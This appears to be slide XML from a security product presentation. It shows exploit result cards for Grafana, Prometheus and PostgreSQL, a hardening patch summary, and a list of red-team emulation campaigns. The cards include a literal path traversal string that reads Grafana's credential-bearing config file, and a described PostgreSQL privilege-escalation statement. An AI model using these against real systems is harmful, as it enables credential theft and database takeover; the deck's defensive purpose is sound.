            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Path traversal via /public/plugins/alertlist/../../../../../../../etc/grafana/grafana.ini reads the Grafana config file, which contains the admin password hash and SMTP credentials. This CVE is on the CISA KEV list — meaning it is actively exploited in the wild. The exploit succeeded in 1.2 seconds with 96% confidence.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="63" name="Rectangle 62"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8311896" y="3291840"/>
            <a:ext cx="1965960" cy="2331720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="889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311896" y="3291840"/>
            <a:ext cx="1965960"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03336" y="3383280"/>
            <a:ext cx="1783080" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="950" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Prometheus</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="66" name="TextBox 65"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9500616" y="3383280"/>
            <a:ext cx="731520" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="r"/>
            <a:r>
              <a:rPr sz="800" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>BLOCKED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="67" name="TextBox 66"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8403336" y="3639312"/>
            <a:ext cx="1783080" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2019-3826</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="68" name="TextBox 67"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8403336" y="3822192"/>
            <a:ext cx="1783080" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>6.1 MEDIUM</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="69" name="TextBox 68"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8403336" y="4005072"/>
            <a:ext cx="1783080" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Confidence: 22%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="70" name="TextBox 69"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8403336" y="4206240"/>
            <a:ext cx="1783080" cy="1234440"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The /metrics endpoint is exposed without authentication and reveals internal IP addresses, service names, and resource utilisation of all monitored services. While the RCE chain did not complete (low confidence 22%), the unauthenticated exposure constitutes an information disclosure that aids attacker reconnaissance — mapping the internal network in seconds.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="71" name="Rectangle 70"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10332720" y="3291840"/>
            <a:ext cx="1965960" cy="2331720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="889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0332720" y="3291840"/>
            <a:ext cx="1965960"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424160" y="3383280"/>
            <a:ext cx="1783080" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="950" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PostgreSQL</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="74" name="TextBox 73"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11521440" y="3383280"/>
            <a:ext cx="731520" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="r"/>
            <a:r>
              <a:rPr sz="800" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EXPLOITED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="75" name="TextBox 74"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10424160" y="3639312"/>
            <a:ext cx="1783080" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2024-0985</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="76" name="TextBox 75"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10424160" y="3822192"/>
            <a:ext cx="1783080" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>8.0 HIGH</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="77" name="TextBox 76"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10424160" y="4005072"/>
            <a:ext cx="1783080" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Confidence: 84%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="78" name="TextBox 77"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10424160" y="4206240"/>
            <a:ext cx="1783080" cy="1234440"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A low-privilege application user (shipment_app) executes ALTER TABLE shipments SET SCHEMA pg_catalog, triggering a privilege escalation path that grants superuser capabilities. This gives the attacker full database owner rights: read all tables, create backdoor users, exfiltrate the entire shipments database including customer PII and delivery coordinates.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="79" name="Rectangle 78"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="5715000"/>
            <a:ext cx="11731752" cy="530352"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="05150F"/>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65760" y="5806440"/>
            <a:ext cx="11457432" cy="393192"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Patch Summary (bottom of page) — six cards on the logistics-patches branch show exactly what each hardening fix does: ERPNext (change default creds + upgrade + rate-limit), Redis (requirepass + rename CONFIG/SLAVEOF + ACL), Kafka (SASL/SCRAM + topic ACLs + remove exposed JMX port), PostgreSQL (scram-sha-256 + least-privilege + SSL), Grafana (pin v10.4.2+ + strong admin password + block host port), Prometheus (basic auth + remove host port + upgrade).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Red Team / Adversary Emulation</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MITRE ATT&amp;CK kill-chain campaigns with real-world threat actor TTPs — APT29, LockBit, SolarWinds</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Red Team module enables structured adversary emulation exercises that go far beyond simple vulnerability scanning. The team creates campaigns modelled on real-world threat actors — APT29 (Cozy Bear), LockBit 3.0 ransomware, or custom SolarWinds-style supply chain attacks. Each campaign maps every tested technique to the full MITRE ATT&amp;CK kill chain, from Reconnaissance through to Impact. Progress is tracked phase by phase, critical findings are documented with CVSS scores and remediation recommendations, and the entire exercise is time-stamped for audit evidence. The kill chain visualiser turns a complex multi-stage attack into a clear, board-readable narrative.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="210312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2139696"/>
            <a:ext cx="11731752" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  Active &amp; Completed Red Team Campaigns</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Rectangle 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="2359152"/>
            <a:ext cx="11731752" cy="521207"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>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2450592"/>
            <a:ext cx="914400" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>RT-2026-03</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="TextBox 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1298448" y="2450592"/>
            <a:ext cx="4114800" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1000" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>APT29 Emulation — Cozy Bear TTPs</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="TextBox 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5532120" y="2450592"/>
            <a:ext cx="2011680" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Threat actor: APT29</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="TextBox 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7680960" y="2450592"/>
            <a:ext cx="1097280" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="900" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ACTIVE</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="TextBox 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8869680" y="2450592"/>
            <a:ext cx="3017520" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>14 findings  |  4 critical</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Rectangle 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1298448" y="2706624"/>
            <a:ext cx="7498079"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98448" y="2706624"/>
            <a:ext cx="5098694" cy="914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15400" y="2633472"/>
            <a:ext cx="548640" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>68%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Rectangle 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="2926080"/>
            <a:ext cx="11731752" cy="521207"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>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017520"/>
            <a:ext cx="914400" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>RT-2026-07</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="TextBox 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1298448" y="3017520"/>
            <a:ext cx="4114800" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1000" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>APT Simulation — Finance Division</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="TextBox 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5532120" y="3017520"/>
            <a:ext cx="2011680" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Threat actor: APT29</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="TextBox 23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7680960" y="3017520"/>
            <a:ext cx="1097280" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="900" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>COMPLETED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="TextBox 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8869680" y="3017520"/>
            <a:ext cx="3017520" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>5 findings  |  2 critical</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1298448" y="3273552"/>
            <a:ext cx="7498079"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98448" y="3273552"/>
            <a:ext cx="7498079" cy="91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3200400"/>
            <a:ext cx="548640" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>100%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Rectangle 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="3493008"/>
            <a:ext cx="11731752" cy="521207"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>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 y="3584448"/>
            <a:ext cx="914400" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>RT-2026-02</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="TextBox 30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1298448" y="3584448"/>
            <a:ext cx="4114800" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1000" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Ransomware Kill Chain — LockBit 3.0</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5532120" y="3584448"/>
            <a:ext cx="2011680" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Threat actor: LockBit 3.0</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="TextBox 32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7680960" y="3584448"/>
            <a:ext cx="1097280" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="900" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>COMPLETED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="TextBox 33"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8869680" y="3584448"/>
            <a:ext cx="3017520" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>22 findings  |  8 critical</a:t>
            </a:r>
          </a:p>
        </p:txBody>
